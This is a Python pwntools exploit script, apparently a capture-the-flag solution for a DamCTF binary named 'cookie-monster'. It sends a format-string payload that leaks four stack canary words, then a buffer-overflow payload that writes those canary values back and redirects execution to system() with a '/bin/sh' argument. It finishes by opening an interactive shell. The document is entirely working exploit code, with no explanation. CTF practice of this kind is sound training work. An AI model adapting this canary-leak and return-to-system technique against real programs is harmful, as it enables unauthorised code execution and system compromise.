from pwn import *

#io = remote('chals.damctf.xyz',31312)
io = process('./cookie-monster')
print io.recvuntil('Enter your name:')
io.sendline('%15$x %16$x %17$x %18$x')
buf = io.recvuntil('What would you like to purchase?').strip()
cookie1 = buf.split('\n')[0].split(' ')[1]
cookie2 = buf.split('\n')[0].split(' ')[2]
cookie3 = buf.split('\n')[0].split(' ')[3]
cookie4 = buf.split('\n')[0].split(' ')[4]
#print cookie1,cookie2,cookie3,cookie4
stack_cookie1 = p32(int(cookie1,16))
stack_cookie2 = p32(int(cookie2,16))
stack_cookie3 = p32(int(cookie3,16))
stack_cookie4 = p32(int(cookie4,16))
system = p32(0x8048440)
binsh = p32(0x08048770)
io.sendline(0x20*'A'+stack_cookie1+stack_cookie2+stack_cookie3+stack_cookie4+system+4*'A'+binsh)

#print(io.recvrepeat(timeout = 10))
io.interactive()
'''
print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))
'''
